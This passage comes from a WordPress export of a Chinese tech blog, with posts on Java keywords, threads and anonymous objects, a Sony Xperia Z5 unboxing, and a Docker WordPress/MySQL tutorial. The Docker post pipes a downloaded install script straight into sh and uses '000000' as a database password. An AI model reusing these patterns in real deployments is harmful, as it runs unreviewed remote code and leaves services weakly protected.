        prt("______");
    }
    Chinese(String name, int age) {
        this(name);// 调用!!当前!!具有相同形参的构造函数（3）
        prt("his age is:" + age);
        prt("______");
    }
    public static void main(String[] args) {
        Chinese cn = new Chinese();
        cn = new Chinese("kevin");
        cn = new Chinese("kevin", 22);
    }
}</pre>

输出结果为：
<code>A Person.</code>
<code>A chinese.</code>
<code>______</code>
<code>A person name is:kevin</code>
<code>his name is:kevin</code>
<code>______</code>
<code>A person name is:kevin</code>
<code>his name is:kevin</code>
<code>______</code>
<code>his age is:22</code>
<code>______</code>
在这段程序中，this和super不再是像以前那样用 “ <strong><span style="color: #ff0000;">.</span></strong> ”连接一个方法或成员，而是直接在其后跟
上适当的参数，因此它的意义也就有了变化。super后加参数的是用来调用父类中具有相同形式的
构造函数，如1和2处。this后加参数则调用的是当前具有相同参数的构造函数，如3处。当然，在
Chinese的各个重载构造函数中，this和super在一般方法中的各种用法也仍可使用，比如4处，你
可以将它替换为“this.prt”(因为它继承了父类中的那个方法）或者是“super.prt”（因为它
是父类中的方法且可被子类访问），它照样可以正确运行。但这样似乎就有点画蛇添足的味道
了。
最后，写了这么多，如果你能对“<span style="color: #ff0000;">this通常指代当前对象，super通常指代父类</span>”这句话牢记在
心，那么本篇便达到了目的，其它的你自会在以后的编程实践当中慢慢体会、掌握。另外关于本
篇中提到的继承，请参阅相关Java教程。]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>610</wp:post_id>
		<wp:post_date><![CDATA[2016-01-15 14:50:36]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2016-01-15 06:50:36]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[java%e4%b8%ad%e7%9a%84super%e5%85%b3%e9%94%ae%e5%ad%97]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="java"><![CDATA[Java]]></category>
		<category domain="post_tag" nicename="java"><![CDATA[Java]]></category>
		<category domain="post_tag" nicename="super"><![CDATA[super]]></category>
		<category domain="post_tag" nicename="this"><![CDATA[this]]></category>
		<category domain="category" nicename="uncategorized"><![CDATA[未分类]]></category>
						<wp:postmeta>
		<wp:meta_key><![CDATA[_wpcom_is_markdown]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_music_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[xiami]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[mp3_xiami_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[song]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_lyric_open]]></wp:meta_key>
		<wp:meta_value><![CDATA[close]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[views]]></wp:meta_key>
		<wp:meta_value><![CDATA[232]]></wp:meta_value>
		</wp:postmeta>
							</item>
					<item>
		<title>Sony Xperia Z5 墨绿色台版单卡版开箱</title>
		<link>https://www.nervgeek.com/2016/01/21/sony-xperia-z5-%e5%a2%a8%e7%bb%bf%e8%89%b2%e5%8f%b0%e7%89%88%e5%8d%95%e5%8d%a1%e7%89%88%e5%bc%80%e7%ae%b1/</link>
		<pubDate>Wed, 20 Jan 2016 16:50:35 +0000</pubDate>
		<dc:creator><![CDATA[Mr9esx]]></dc:creator>
		<guid isPermaLink="false">https://www.nervgeek.com/?p=684</guid>
		<description></description>
		<content:encoded><![CDATA[前个星期买的Z5台版绿色终于到了，之前在Z5P和Z5之间有点小纠结，但Z5P的4K屏幕不是全时开启，而且屏幕也是个电老虎，续航直线下降，对于我这种重度手机使用者来说肯定是不能接受的。
Z5到手之后，服役一年多的Z2给了老妈继续服役，服役老妈两年的Z1给了老爸替换掉老爸那台傻逼魅蓝note(魅族现在真是...)。其实用性能的眼光去看，不管是Z2、Z1，其实都能满足日常生活以及游戏需求。但我为什么还是要换Z5？且听我慢慢道来。
边上照边说话！
<a href="https://www.nervgeek.com/wp-content/uploads/2016/01/MG_7235-e1453308028590.jpg" rel="attachment wp-att-714"><img class="alignnone size-full wp-image-714" src="https://www.nervgeek.com/wp-content/uploads/2016/01/MG_7235-e1453308028590.jpg" alt="_MG_7235" width="1920" height="1280" /></a>
<a href="https://www.nervgeek.com/wp-content/uploads/2016/01/MG_7216.jpg" rel="attachment wp-att-705"><img class="alignnone size-full wp-image-705" src="https://www.nervgeek.com/wp-content/uploads/2016/01/MG_7216.jpg" alt="_MG_7216" width="3456" height="2304" /></a>
耳机有尘..没办法用了大半年了，Z5的骚绿是真的闷骚得不行，低调却不失几分风骚。
<!--more-->
<a href="https://www.nervgeek.com/wp-content/uploads/2016/01/MG_7224.jpg" rel="attachment wp-att-706"><img class="alignnone size-full wp-image-706" src="https://www.nervgeek.com/wp-content/uploads/2016/01/MG_7224.jpg" alt="_MG_7224" width="3456" height="2304" /></a>
索尼的息屏美学！这圣光...打光打得不好，见谅。
&nbsp;
<a href="https://www.nervgeek.com/wp-content/uploads/2016/01/MG_7227.jpg" rel="attachment wp-att-711"><img class="alignnone size-full wp-image-711" src="https://www.nervgeek.com/wp-content/uploads/2016/01/MG_7227.jpg" alt="_MG_7227" width="3456" height="2304" /></a>
正面依旧是<strong>隐藏式双声道喇叭</strong>，上下各一个，最大音量个人感觉适中。呼吸灯不像Z2那样，隐藏在上面的喇叭，长长一道呼吸灯，而是在左上角有个圆圈的LED灯，像LT26I。
另外提一点，正面的SONY的Logo，是暗灰色，所以正面的Logo不显眼，总感觉少了几分信仰。
&nbsp;
<a href="https://www.nervgeek.com/wp-content/uploads/2016/01/MG_7219.jpg" rel="attachment wp-att-707"><img class="alignnone wp-image-707 size-full" src="https://www.nervgeek.com/wp-content/uploads/2016/01/MG_7219-e1453306115214.jpg" alt="_MG_7219" width="2082" height="1244" /></a>
<strong>侧面刻印Xperia</strong>(手机放反了..)，手机<strong>侧面刻印Logo</strong>真的是市面上极其少见的装饰，逼格Max！可谓是Z5<strong>机身的点睛之笔！</strong>
&nbsp;
<a href="https://www.nervgeek.com/wp-content/uploads/2016/01/MG_7228-e1453306929783.jpg" rel="attachment wp-att-712"><img class="alignnone size-full wp-image-712" src="https://www.nervgeek.com/wp-content/uploads/2016/01/MG_7228-e1453306929783.jpg" alt="_MG_7228" width="3067" height="1270" /></a>
这次Z5新增了<strong>指纹识别功能</strong>，是市面上唯一一台指纹识别放在机身侧面，而且还是<strong>唯一一台指纹识别和电源键结合成一体</strong>的机型！而且索尼一直提供<strong>实体键拍摄按钮</strong>，<strong>半按对焦全按拍摄</strong>，也是非常的方便人性化。音量键相比前代系列往下挪了不少，但实际上并不会影响太大。
&nbsp;
<a href="https://www.nervgeek.com/wp-content/uploads/2016/01/MG_7220.jpg" rel="attachment wp-att-709"><img class="alignnone size-full wp-image-709" src="https://www.nervgeek.com/wp-content/uploads/2016/01/MG_7220.jpg" alt="_MG_7220" width="3456" height="2304" /></a>
另一侧面除了雕刻的Xperia，还有Nano-SIM卡和TF卡的卡槽，都放在同一个盖子里面，估计这辈子都不怎么可能打开这个盖子了，再也不用担心经常打开盖子不防水了。
&nbsp;
<a href="https://www.nervgeek.com/wp-content/uploads/2016/01/MG_7221-e1453307240614.jpg" rel="attachment wp-att-710"><img class="alignnone size-full wp-image-710" src="https://www.nervgeek.com/wp-content/uploads/2016/01/MG_7221-e1453307240614.jpg" alt="_MG_7221" width="2341" height="1365" /></a>
这次Z5并没有采用Type-C接口，但是<strong>Z5支持快充</strong>，下面会聊到充电的时间。接口旁边还有日系<strong>永远都不抛弃的挂饰孔</strong>，现在的手机几乎都取消这个设计，实在是不懂。
&nbsp;
<a href="https://www.nervgeek.com/wp-content/uploads/2016/01/MG_7229-e1453307394524.jpg" rel="attachment wp-att-713"><img class="alignnone size-full wp-image-713" src="https://www.nervgeek.com/wp-content/uploads/2016/01/MG_7229-e1453307394524.jpg" alt="_MG_7229" width="1460" height="846" /></a>
这次镜头搭配索尼自家最高规格的手机<strong>CMOS传感器IMX330</strong>，<strong>2300万的像素</strong>，<strong>1/2.3英寸的卡片机底</strong>，<strong>24mm广角的六镜式G镜头</strong>，<strong>感光度最高可达12800</strong>，依旧是<strong>索尼Exmor RS堆栈式结构</strong>，<strong>BionZ影像处理器</strong>移动版并且支持<strong>反差+相位的混合式对焦</strong>。
镜头参数说起来很屌的样子，实际个人感觉Z系列横向对比的确有不少的提升，但还是没能发挥出这个怪物传感器的真正实力。
&nbsp;
<a href="https://www.nervgeek.com/wp-content/uploads/2016/01/MG_7251-e1453307995574.jpg" rel="attachment wp-att-716"><img class="alignnone size-full wp-image-716" src="https://www.nervgeek.com/wp-content/uploads/2016/01/MG_7251-e1453307995574.jpg" alt="_MG_7251" width="1920" height="1280" /></a> 默认黑色主题，低调。
以上就是Z5机身测评。系统软件测评我继续慢慢填坑，现在聊一下快充的充电速度。
&nbsp;
台版是配送快充插头UCH-10的，淘宝另售价格在165+。
<a href="https://www.nervgeek.com/wp-content/uploads/2016/01/PFNKOZPVJGHKWKENW.png" rel="attachment wp-att-717"><img class="alignnone size-full wp-image-717" src="https://www.nervgeek.com/wp-content/uploads/2016/01/PFNKOZPVJGHKWKENW.png" alt="_P(FNK[OZPVJGHKWK&#96;(EN(W" width="338" height="506" /></a>
经过实测，0%没电关机到100%所需时间为92分钟，0%到50%大概需要35分钟。对比以前的Z2，充电速度真的是肉眼可见的狂飙。
&nbsp;]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>684</wp:post_id>
		<wp:post_date><![CDATA[2016-01-21 00:50:35]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2016-01-20 16:50:35]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[sony-xperia-z5-%e5%a2%a8%e7%bb%bf%e8%89%b2%e5%8f%b0%e7%89%88%e5%8d%95%e5%8d%a1%e7%89%88%e5%bc%80%e7%ae%b1]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="showtime"><![CDATA[ShowTime]]></category>
		<category domain="post_tag" nicename="sony"><![CDATA[Sony]]></category>
		<category domain="post_tag" nicename="xperia"><![CDATA[Xperia]]></category>
		<category domain="post_tag" nicename="z5"><![CDATA[Z5]]></category>
		<category domain="post_tag" nicename="%e4%bf%a1%e4%bb%b0"><![CDATA[信仰]]></category>
		<category domain="post_tag" nicename="%e5%8e%9f%e5%88%9b"><![CDATA[原创]]></category>
		<category domain="post_tag" nicename="%e6%99%92"><![CDATA[晒]]></category>
		<category domain="category" nicename="uncategorized"><![CDATA[未分类]]></category>
		<category domain="post_tag" nicename="%e7%b4%a2%e5%b0%bc"><![CDATA[索尼]]></category>
						<wp:postmeta>
		<wp:meta_key><![CDATA[_wpcom_is_markdown]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_music_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[xiami]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[mp3_xiami_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[song]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_lyric_open]]></wp:meta_key>
		<wp:meta_value><![CDATA[close]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[views]]></wp:meta_key>
		<wp:meta_value><![CDATA[708]]></wp:meta_value>
		</wp:postmeta>
							</item>
					<item>
		<title>15个多线程面试题之一</title>
		<link>https://www.nervgeek.com/2016/01/20/15%e4%b8%aa%e5%a4%9a%e7%ba%bf%e7%a8%8b%e9%9d%a2%e8%af%95%e9%a2%98%e4%b9%8b%e4%b8%80/</link>
		<pubDate>Wed, 20 Jan 2016 07:58:09 +0000</pubDate>
		<dc:creator><![CDATA[Mr9esx]]></dc:creator>
		<guid isPermaLink="false">https://www.nervgeek.com/?p=702</guid>
		<description></description>
		<content:encoded><![CDATA[<strong><span style="font-size: 18pt;">1. 有T1、T2、T3三个线程，如何怎样保证T2在T1执行完后执行，T3在T2执行完后执行？</span></strong>
使用<code>join</code>方法。
<code>join</code>方法的功能是使异步执行的线程变成同步执行。即调用线程实例的<code>start</code>方法后，该方法会立即返回，如果调用<code>start</code>方法后，需要使用一个由这个线程计算得到的值，就必须使用<code>join</code>方法。如果不使用<code>join</code>方法，就不能保证当执行到<code>start</code>方法后面的某条语句时，这个线程一定会执行完。而使用<code>join</code>方法后，直到这个线程退出，程序才会往下执行。
&nbsp;
<strong><span style="font-size: 18pt;">2.Java中的Lock接口，比起synchronized，优势在哪里？</span></strong>
如果需要实现一个高效的缓存，它允许多个用户读，但只允许一个用户写，以此来保持它的完整性，如何实现？
<code>Lock</code>接口最大的优势是为读和写分别提供了锁。
读写锁<code>ReadWriteLock</code>拥有更加强大的功能，它可细分为读锁和解锁。
读锁可以允许多个进行读操作的线程同时进入，但不允许写进程进入；写锁只允许一个写进程进入，在这期间任何进程都不能再进入。（完全符合题目中允许多个用户读和一个用户写的条件）
要注意的是每个读写锁都有挂锁和解锁，最好将每一对挂锁和解锁操作都用<code>try</code>、<code>finally</code>来套入中间的代码，这样就会防止因异常的发生而造成死锁得情况。
<!--more-->
下面是一个示例程序：

<pre>import java.util.Random;
import java.util.concurrent.locks.*;
public class ReadWriteLockTest {
    public static void main(String[] args) {
        final TheData myData=new TheData(); //这是各线程的共享数据
        for(int i=0;i&lt;3;i++){ //开启3个读线程
            new Thread(new Runnable(){
                @Override
                public void run() {
                    while(true){
                        myData.get();
                    }
                }
            }).start();
        }
        for(int i=0;i&lt;3;i++){ //开启3个写线程
            new Thread(new Runnable(){
                @Override
                public void run() {
                    while(true){
                        myData.put(new Random().nextInt(10000));
                    }
                }
            }).start();
        }
    }
}
class TheData{
    private Object data=null;
    private ReadWriteLock rwl=new ReentrantReadWriteLock();
    public void get(){
        rwl.readLock().lock(); //读锁开启，读线程均可进入
        try { //用try finally来防止因异常而造成的死锁
            System.out.println(Thread.currentThread().getName()+"is ready to read");
            Thread.sleep(new Random().nextInt(100));
            System.out.println(Thread.currentThread().getName()+"have read date"+data);
        } catch (InterruptedException e) {
            e.printStackTrace();
        } finally{
            rwl.readLock().unlock(); //读锁解锁
        }
    }
    public void put(Object data){
        rwl.writeLock().lock(); //写锁开启，这时只有一个写线程进入
        try {
            System.out.println(Thread.currentThread().getName()+"is ready to write");
            Thread.sleep(new Random().nextInt(100));
            this.data=data;
            System.out.println(Thread.currentThread().getName()+"have write date"+data);
        } catch (InterruptedException e) {
            e.printStackTrace();
        } finally{
            rwl.writeLock().unlock(); //写锁解锁
        }
    }
}</pre>

&nbsp;
<strong><span style="font-size: 18pt;">3. java中wait和sleep方法有何不同？</span></strong>
最大的不同是在等待时<code>wait</code>会释放锁，而<code>sleep</code>一直持有锁。<code>wait</code>通常被用于线程间交互，<code>sleep</code>通常被用于暂停执行。
其它不同有：
* <code>sleep</code>是<code>Thread</code>类的静态方法，<code>wait</code>是<code>Object</code>方法。
* <code>wait</code>，<code>notify</code>和<code>notifyAll</code>只能在同步控制方法或者同步控制块里面使用，而<code>sleep</code>可以在任何地方使用
* <code>sleep</code>必须捕获异常，而<code>wait</code>，<code>notify</code>和<code>notifyAll</code>不需要捕获异常
&nbsp;
&nbsp;]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>702</wp:post_id>
		<wp:post_date><![CDATA[2016-01-20 15:58:09]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2016-01-20 07:58:09]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[15%e4%b8%aa%e5%a4%9a%e7%ba%bf%e7%a8%8b%e9%9d%a2%e8%af%95%e9%a2%98%e4%b9%8b%e4%b8%80]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="myphoto"><![CDATA[个人摄影]]></category>
		<category domain="category" nicename="uncategorized"><![CDATA[未分类]]></category>
						<wp:postmeta>
		<wp:meta_key><![CDATA[_wpcom_is_markdown]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[views]]></wp:meta_key>
		<wp:meta_value><![CDATA[470]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_music_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[xiami]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[mp3_xiami_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[song]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_lyric_open]]></wp:meta_key>
		<wp:meta_value><![CDATA[close]]></wp:meta_value>
		</wp:postmeta>
							</item>
					<item>
		<title>Docker入门以及搭建WordPress与MySQL</title>
		<link>https://www.nervgeek.com/2016/01/21/docker%e5%85%a5%e9%97%a8%e4%bb%a5%e5%8f%8a%e6%90%ad%e5%bb%bawordpress%e4%b8%8emysql/</link>
		<pubDate>Thu, 21 Jan 2016 08:23:00 +0000</pubDate>
		<dc:creator><![CDATA[Mr9esx]]></dc:creator>
		<guid isPermaLink="false">https://www.nervgeek.com/?p=722</guid>
		<description></description>
		<content:encoded><![CDATA[上年因为比赛所需稍微接触了一下(真的只有一下)Docker，那个时候连启动都不知道，只是去维基了下Docker罢了。
回到正题，我搭建Docker的环境如下：
<strong>Windows 10 运行 VM 12 Pro，安装Ubuntu Server 14.04 LTS。</strong>
<a href="https://www.nervgeek.com/wp-content/uploads/2016/01/4E@HOJXFUBD1TNMNYQ.png" rel="attachment wp-att-723"><img class="alignnone size-full wp-image-723" src="https://www.nervgeek.com/wp-content/uploads/2016/01/4E@HOJXFUBD1TNMNYQ.png" alt="4E@H%OJ&#96;XFUBD1{T&#96;NMNY~Q" width="1161" height="751" /></a>
<span style="color: red;"><i class="icon-warning-sign"></i><span style="font-size: 10pt;"><strong>注意：使用<code>CentOS</code>、<code>RedHat</code>等其他Linux发行版也可以，但要确保Linux内核版本号大于3.10，可使用<code>uname -r</code>命令查看。</strong></span>
</span>
<!--more-->
<strong><span style="font-size: 24pt;">一、安装Docker</span></strong>
<strong>1 . 请使用root登陆系统，或者可以执行sudo命令。</strong>
<strong>2 . 检查系统内是否安装了curl：</strong>

<pre>which curl</pre>

Ubuntu Server 14.04 LTS会返回<code>/usr/bin/curl</code>
如没有安装curl，请在更新apt源之后安装curl包：

<pre>sudo apt-get update
sudo apt-get install curl</pre>

<strong>3 . 获取最新的Docker安装脚本</strong>

<pre>curl -sSL https://get.docker.com/ | sh</pre>

脚本可能会提示你输入密码，然后会开始执行安装。
<strong>4 . 下载一个测试用的Docker镜像并运行Hello World，确认Docker是否安装成功</strong>

<pre>sudo docker run hello-world</pre>

如果到此您顺利执行成功，恭喜您，您已经成功安装Docker了。
&nbsp;
<strong><span style="font-size: 24pt;">二、安装、运行MySQL镜像</span></strong>
<strong>1 . 下载MySQL Docker镜像</strong>

<pre>docker pull mysql</pre>

稍等片刻，镜像就会下载完成
<strong>2 . 运行MySQL镜像</strong>

<pre>docker run --name some-mysql -e MYSQL_ROOT_PASSWORD=000000 -d mysql</pre>

<code>run</code>参数表示运行一个镜像，创建一个容器。<code>--name</code>参数用于区分不同容器的名字。MySQL密码设置用<code>-e MYSQL_ROOT_PASSWORD=000000</code>来设置。<code>-d</code>参数能让容器在后台继续运行。-d后面的<code>mysql</code>就是表示使用mysql镜像。
<strong>3 . 查看运行在后台的容器</strong>
在上一步中，我们已经成功运行一个mysql容器并在后台持续运行，如果我们想看到这个容器的详细信息，可用

<pre>docker ps</pre>

来查看，会返回：

<table>
<tbody>
<tr>
<td>CONTAINER ID</td>
<td>IMAGE</td>
<td>COMMAND</td>
<td>CREATED</td>
<td>STATUS</td>
<td>PORTS</td>
<td>NAMES</td>
</tr>
<tr>
<td>c610516fa538</td>
<td>mysql</td>
<td>"/entrypoint.sh mysql"</td>
<td>4 seconds ago</td>
<td>Up 3 seconds</td>
<td>3306/tcp</td>
<td>some-mysql</td>
</tr>
</tbody>
</table>

如果成功返回上面的信息，恭喜您，您的MySQL容器成功运行在后台了。
&nbsp;
<strong><span style="font-size: 24pt;">二、安装、运行WordPress镜像</span></strong>
<strong>1 . 下载WordPress Docker镜像</strong>

<pre>docker pull wordpress</pre>

稍等片刻，镜像就会下载完成
<strong>2 . 运行WordPress镜像，并链接到已运行的MySQL容器</strong>

<pre>docker run --name some-wordpress --link some-mysql:mysql -p 8080:80 -e WORDPRESS_DB_PASSWORD=000000 -d wordpress</pre>

<code>run</code>、<code>--name</code>和<code>-d</code>参数在第二节MySQL安装已经提到过，在此不再复述。<code>--link</code>参数用于连接多个容器协同工作，本次实验WordPress需要用到MySQL服务，所以需要link到已经在运行名为some-mysql容器上。<code>-p</code>参数用于把容器内部的端口服务映射到系统的端口上，<code>-p 8080:80</code>表示把容器内的80端口映射到实体机上的8080端口。搭建过WordPress的人都知道，WordPress有个配置文件，在此需要用<code>-e WORDPRESS_DB_PASSWORD=000000</code>命令来设置数据库密码。
&nbsp;
<strong><span style="font-size: 24pt;">三、在浏览器查看应用</span></strong>
<a href="https://www.nervgeek.com/wp-content/uploads/2016/01/Q5GOEEPY@SYVBMN630J.png" rel="attachment wp-att-733"><img class="alignnone size-full wp-image-733" src="https://www.nervgeek.com/wp-content/uploads/2016/01/Q5GOEEPY@SYVBMN630J.png" alt="Q5GOE(EPY&#96;@SYVBM~N6~30J" width="1977" height="1152" /></a>
好了！已经成功部署好WordPress了！
&nbsp;
<strong>本次笔记知识记录：</strong>
<code>run</code>：运行一个镜像，创建一个容器。
<code>--name</code>：指定容器的名字。
<code>-e MYSQL_ROOT_PASSWORD=000000</code>：设置MySQL密码。
<code>-d</code>：让容器在后台继续运行。
<code>--link</code>：连接多个容器协同工作。
<code>-p</code>：容器内部的端口服务映射到系统的端口。
参考：<a href="http://docker.widuu.com/">http://docker.widuu.com/</a>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>722</wp:post_id>
		<wp:post_date><![CDATA[2016-01-21 16:23:00]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2016-01-21 08:23:00]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[docker%e5%85%a5%e9%97%a8%e4%bb%a5%e5%8f%8a%e6%90%ad%e5%bb%bawordpress%e4%b8%8emysql]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="docker"><![CDATA[Docker]]></category>
		<category domain="post_tag" nicename="docker"><![CDATA[Docker]]></category>
		<category domain="post_tag" nicename="linux"><![CDATA[Linux]]></category>
		<category domain="post_tag" nicename="mysql"><![CDATA[MySQL]]></category>
		<category domain="post_tag" nicename="ubuntu"><![CDATA[Ubuntu]]></category>
		<category domain="post_tag" nicename="wordpress"><![CDATA[wordpress]]></category>
		<category domain="category" nicename="%e4%ba%91%e8%ae%a1%e7%ae%97"><![CDATA[云计算]]></category>
		<category domain="post_tag" nicename="%e4%ba%91%e8%ae%a1%e7%ae%97"><![CDATA[云计算]]></category>
		<category domain="category" nicename="uncategorized"><![CDATA[未分类]]></category>
		<category domain="category" nicename="%e7%bd%91%e7%ab%99%e5%bb%ba%e8%ae%be"><![CDATA[网站建设]]></category>
						<wp:postmeta>
		<wp:meta_key><![CDATA[_wpcom_is_markdown]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_music_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[xiami]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[mp3_xiami_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[song]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_lyric_open]]></wp:meta_key>
		<wp:meta_value><![CDATA[close]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[views]]></wp:meta_key>
		<wp:meta_value><![CDATA[343]]></wp:meta_value>
		</wp:postmeta>
							</item>
					<item>
		<title>Java中的匿名对象</title>
		<link>https://www.nervgeek.com/2016/01/22/java%e4%b8%ad%e7%9a%84%e5%8c%bf%e5%90%8d%e5%af%b9%e8%b1%a1/</link>
		<pubDate>Fri, 22 Jan 2016 07:46:37 +0000</pubDate>
		<dc:creator><![CDATA[Mr9esx]]></dc:creator>
		<guid isPermaLink="false">https://www.nervgeek.com/?p=741</guid>
		<description></description>
		<content:encoded><![CDATA[<strong>匿名对象有两个特点：</strong>
<strong>1 .</strong> 匿名对象是没有别其它对象所引用
<strong>2 .</strong> 使用一次就变成垃圾，被Java的垃圾回收器收回。
<!--more-->
<strong><span style="font-size: 18pt;">第一种匿名对象的应用：</span></strong>
<strong>匿名对象应用一：</strong>
只调用对象方法一次的时候，可以使用匿名对象来调用，以达到简化的目的。
假如需要对这个对象多次调用方法或者是变量的话，必须要使用有名对象进行调用。
<strong>示例代码：</strong>

<pre>class Car{
    String color = "red";
    int num = 4;
    void run(){
        System.out.println("This cat is running!"+color+" and "+num);
    }
}
class Show{
    public static void main(String[] args){
        new Car().num = 5;//开辟一个内存区块，把4改成5
        new Car().color = "blue";//执行到这步的时候，上面的new Car().num = 5;已经被回收了
        new Car().run();//输出This cat is running!red and 4
        /*
            对于方法的调用:
            Car c = new Car();
            c.run();
            和
            new Car().run();
            的效果是一模一样的，但有名对象能继续调用其它函数，匿名使用一次之后就丢掉了。
        */
    }
}</pre>

&nbsp;
&nbsp;
<strong><span style="font-size: 18pt;">第二种匿名对象的应用：</span></strong>
<strong>匿名对象应用二：</strong>
可以将匿名对象作为参数进行传递。
<strong>示例代码：</strong>

<pre>class Car{
    String color = "red";
    int num = 4;
    void run(){
        System.out.println("This cat is running!"+color+" and "+num);
    }
}
class Show{
    public static void main(String[] args){
        //首先这里是有名对象的传递
        Car q = new Car();
        show(q);//输出This cat is running!black and 3
        q.run();//同样输出This cat is running!black and 3
        //可以看出，传递过去的对象q和在main内使用的对象是同一个对象
        //q = null;可以提醒回收机制回收。
        //匿名对象也能传递
        show(new Car());//同样输出This cat is running!black and 3
        //在show方法内，传递过去的匿名函数赋给了c，所以在show方法内，变成了有名对象
        //但无法在main内继续调用，用完就丢弃
    }
    public static void show(Car c){
        c.num = 3;
        c.color = "black";
        c.run();
    }
}</pre>

实际编程中可以根据情况使用，可以减少代码书写。]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>741</wp:post_id>
		<wp:post_date><![CDATA[2016-01-22 15:46:37]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2016-01-22 07:46:37]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[java%e4%b8%ad%e7%9a%84%e5%8c%bf%e5%90%8d%e5%af%b9%e8%b1%a1]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="java"><![CDATA[Java]]></category>
		<category domain="post_tag" nicename="java"><![CDATA[Java]]></category>
		<category domain="post_tag" nicename="%e5%8c%bf%e5%90%8d%e5%af%b9%e8%b1%a1"><![CDATA[匿名对象]]></category>
		<category domain="category" nicename="uncategorized"><![CDATA[未分类]]></category>
						<wp:postmeta>
		<wp:meta_key><![CDATA[_wpcom_is_markdown]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[views]]></wp:meta_key>
		<wp:meta_value><![CDATA[290]]></wp:meta_value>
		</wp:postmeta>
